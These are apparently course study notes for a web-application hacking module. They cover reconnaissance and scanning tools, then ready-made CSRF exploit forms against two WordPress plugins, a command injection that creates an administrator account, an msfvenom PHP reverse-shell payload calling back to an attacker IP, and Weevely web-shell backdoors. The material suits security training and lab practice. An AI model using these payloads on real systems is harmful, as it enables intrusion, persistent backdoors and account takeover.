# Module 14 - Hacking Web Applications #

## Footprint the Web Infrastructure ##
Footprinting the web infrastructure allows:

* Server Discovery (Whois Lookup, DNS Interrogation, Port Scanning...)
* Service Discovery
* Server Identification (Banner-Grabbing)
* Hidden Content Discovery

### Web Application Reconnaissance ###
* **Whois Lookup**: To gather information about the IP address of the web server.
  * Netcraft (https://www.netcraft.com)
  * SmartWhois (https://www.tamos.com)
  * WHOIS Lookup (http://whois.domaintools.com)
  * Batch IP Converter (http://www.sabsoft.com)
* **DNS Interrogation**: To gather information about the DNS Servers, DNS records and types of servers used by the target. DNS Zone data includes DNS domain names, computer names, IP Addresses, domain mail servers, service records...
  * Professional Toolset (https://tools.dnsstuff.com)
  * DNSRecon (GitHub)
  * DNS Records (https://network-tools.com)
  * Domain Dossier (https://centralops.net)   
* **Port and Service Scan**
  * `nmap -T4 -A -v <URL>`
* **Banner Grabbing**
  * `telnet <URL> 80` > `GET / HTTP/1.0`   

#### WhatWeb ####
WhatWeb identifies websites and recognizes web technologies, including Content Management Systems (CMS), blogging platforms, statistics and analytics packages, JavaScript libraries, web servers, and embedded devices. It also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors...

```whatweb -v <URL>``` > To save the results in a file: `--log-verbose=<output_filename>`

#### OWASP ZAP ####
```zaproxy``` > 'Automated Scan' > Enter the URL > 'Attack' > Go to the 'Alerts' tab to see the vulns found

#### Other Web Spidering / Crawling Tools ####
* Burp Suite (https://portswigger.net)
* WebScarab (https://www.owasp.org)
* Mozenda Web Agent Builder (https://www.mozenda.com)


### Detect Load Balancers ###
Organizations use load balancers to distribute web server load over multiple servers and increase the productivity and reliability of web applications. Generally, there are two types of load balancers: DNS Load Balancers (Layer 4 Load Balancers) and HTTP Load Balancers (Layer 7 Load Balancers).

* dig: `dig <URL>` > The result displays the available load balancers of the target website (ANSWER SECTION - One host resolves to multiple IP Addresses)
* Load Balancing Detector: `lbd <URL>` > It detects the presence of load balancers and their IP Addresses.


### Identify Web Server Directories ###
* Nmap: `nmap -sV --script=http-enum <URL>`
* GoBuster: `gobuster dir -u <URL> -w <Wordlist>`


### Web Application Vulnerability Scanning ###
#### Vega ####
Vega is a web application scanner used to test the security of web applications. It helps in finding and validating SQL Injection, XSS, sensitive information disclosed... It can be found at: `Module 14 Hacking Web Applications\Web Application Hacking Tools\`.

Scan > Start New Scan > Enter a Base URI for Scan, Select all modules, Default 'Parameters' settings, 'Follow Redirect?': Yes

#### Acunetix WVS ####
1. Add Target
2. General > Business Criticality: High
3. Scan > Select the Scan Type, Report and Schedule

#### Other Web Application Vulnerability Scanning Tools ####
* WPScan Vulnerability Database (https://wpvulndb.com)
* Arachni (https://www.arachni-scanner.com)
* appspider (https://www.rapid7.com)
* Uniscan (https://sourceforge.net)


### Identify Clickjacking Vulnerabilities ###
Clickjacking, aka 'UI Redress Attack' or 'Cross-Frame Scripting' (CFS/XFS), occurs when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they intend to click on the top-level page. Thus, the attacker is 'hijacking' clicks meant for the top-level page, and routing them to another page.

#### iframe ####
New Text Document: 'iframe.html'

```
<html>
<head><title>Clickjack Vulnerability Test</title></head>
<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="<URL>" width="800" height="600"></iframe>
</body>
</html>
```


- - - -

## Perform Web Application Attacks ##

### Brute-Force Attack ###
#### Burp Suite ####
Intruder > 'Cluster Bomb' - It uses multiple payload sets. Different payload set for each defined position, it iterates through each set in turn so that *all permutations* of payload combinations are tested.

#### Other Password Cracking Tools ####
* THC-Hydra (GitHub)
* L0phtCrack (https://www.l0phtcrack.com)
* ophcrack (http://ophcrack.sourceforge.net)
* RainbowCrack (http://project-rainbowcrack.com)


### Parameter Tampering ###
#### Burp Suite ####
Proxy > 'Intercept'


### Cross-Site Scripting (XSS) ###
Changing URL parameters to obtain users information. Adding ``` <script>You've been Hacked</script> ``` to a field that reflects information.


### Cross-Site Request Forgery (CSRF) ###
CSRF in a Wordpress site.

### WPScan ###
` wpscan -u <URL> --enumerate vp ` - To enumerate vulnerable plugins. The plugin _Wordpress Firewall 2_ and _leenk.me_ are vulnerable to CSRF.

`wpscan --api-token <API Token> --url <URL> --plugins-detection aggressive --enumerate vp` - Aggressive way to enumerate vulnerable plugins.

Create the _HTML_ file for the _Wordpress Firewall 2_ plugin:
```
  <form method="POST" action="<URL>/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php">
    <script>alert("As an Admin, To enable additional security to your Website. Click Submit")</script>
    <input type="hidden" name="whitelisted_ip[]" value="<Attacker IP>" >
    <input type="hidden" name="set_whitelist_ip" value="Set Whitelisted IPs" class="button-secondary" >
    <input type="submit" >
  </form> 
```

Or create the _HTML_ file for the _leenk.me_ plugin:
```
  <html>
    <body onload="document.forms['CSRF'].submit()">
    <form name="CSRF" action="<URL>/wp-admin/admin.php?page=leenkme_facebook" method="POST">
      <input type="hidden" name="facebook_profile" value="on" />
      <input type="hidden" name="fb_publish_wpnonce" value="" />
      <input type="hidden" name="_wp_http_referer" value="CSRF" />
      <input type="hidden" name="facebook_message" value="Hacked!!" />
      <input type="hidden" name="facebook_linkname" value="CSRF" />
      <input type="hidden" name="facebook_caption" value="CSRF" />
      <input type="hidden" name="facebook_description" value="</textarea>;<script>prompt();</script>" />
      <input type="hidden" name="default_image" value="CSRF" />
      <input type="hidden" name="message_preference" value="author" />
      <input type="hidden" name="clude" value="in" />
      <input type="hidden" name="publish_cats[];" value="0" />
      <input type="hidden" name="update_facebook_settings" value="Save Settings" />
      <input type="submit" value="Submit form" />
    </form>
    </body>
  </html>
```

Lure the victim to execute the script and click on 'Submit'. It will perform the actions in the script: whitelisting the attacker IP so that the firewall does not affect its requests.


### Enumerate and Hack a Web Application ###
#### WPScan ####
``` wpscan (--api-token <API Token>) --url <URL> --enumerate u ``` - Enumerates WordPress information.

#### Metasploit ####
```service postgresql start``` > ``` msfconsole ```

1. ``` use auxiliary/scanner/http/wordpress_login_enum ```
2. ``` show options ```, ``` set PASS_FILE <Path to the Password Wordlist File> ```, ``` set RHOSTS <Target IP> ```, ``` set RPORT <Target Website Port> ```, ``` set TARGETURI <Target URL> ```, ``` set USERNAME <Username to Crack the Password - Ex. admin> ```
3. ``` exploit ```

Try the credentials in ``` <URL>/wp-login.php ```.


### Exploit a Remote Command Execution (RCE) Vulnerability ###
Dvwa:

``` ping 10.10.10.10 | net user test /add ``` - To add a user 

``` | net localgroup Administrators test /add ``` - Add the user to the Administrators group


### Exploit a File Upload Vulnerability ###
``` msfvenom -p php/meterpreter/reverse_tcp lhost=<Attacker IP> lport=<Attacker Listener Port> -f raw ``` - Generating the payload. Copy it to a .php file and upload it to the vulnerable functionality. 

Set up the listener (in msfconsole: `use exploit/multi/handler` > `set payload php/meterpreter/reverse_tcp`). To execute the payload, navigate to the uploaded file in the browser.


### Gain Backdoor Access via a Web Shell ###
#### Weevely ####
Weevely is used to develop a backdoor shell and upload it to a target server in order to gain remote shell access. It also helps in performing administrative tasks, maintaining persistence and spreading backdoors across the target network.

```weevely generate <password> <output_file_path>``` > Upload the file to the vulnerable website > ```weevely <URL where the file has been uploaded and its located at (Ex. http://example.com/uploads/shell.php)> <password>```


- - - -

## Detect Web Application Vulnerabilities ##
### N-Stalker Web Application Security Scanner ###
N-Stalker checks for vulnerabilities such as SQL Injection, XSS... By incorporating the 'N-Stealth HTTP Security Scanner', it is a security tool for developers, system and security administrators and IT auditors. It can be found at: `Module 14 Hacking Web Applications\Web Application Security Testing Tools\`.

'Start' > Enter the URL, Choose the 'OWASP Policy', 'Next' > Leave the other settings as default > 'Start Session' > 'Start Scan'

### Other Web Application Security Testing Tools ###
* Browser Exploitation Framework (BeEF - https://beefproject.com)
* Metasploit (https://www.metasploit.com)
* PowerSploit (GitHub)
* Watcher Web Security Tool (https://www.casaba.com)
* Acunetix WVS (https://www.acunetix.com)
